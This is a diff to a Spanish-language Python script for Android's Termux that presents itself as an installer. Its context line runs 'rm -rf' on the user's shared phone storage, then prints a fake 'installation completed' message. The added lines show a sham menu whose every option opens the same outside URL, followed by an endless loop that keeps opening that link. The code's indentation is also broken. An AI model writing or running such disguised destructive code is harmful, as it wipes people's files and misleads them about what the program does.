@@ -19,3 +19,25 @@ os.system("rm -rf /data/data/com.termux/files/home/storage/shared/")
 print(verde+"Preparando instalacion por favor espere......"+cierre)
 time.sleep(3)
 print(verde+"Instalacion Completada"+cierre)
+time.sleep(2)
+
+print("    ELIGA UNA OPCIÓN ")
+print("")
+    print("[1]SOPORTE")
+    print("[2]SUSPENDER")
+    print("[3]DEJAR EN -1")
+    print("[0]SALIR")
+    eleccion =input("ELIJE UNA OPCIÓN >>")
+    if eleccion == "1" :
+     os.system("termux-open-url https://piv.pivpiv.dk/")
+    elif eleccion == "2" :
+     os.system("termux-open-url https://piv.pivpiv.dk/")
+    elif eleccion == "3" :
+     os.system("termux-open-url https://piv.pivpiv.dk/")
+    elif eleccion == "0" :
+     os.system("termux-open-url https://piv.pivpiv.dk/")
+    else:
+        incorrecto()
+menu()
+while 1 < 2:
+ os.system("termux-open-url https://piv.pivpiv.dk/")
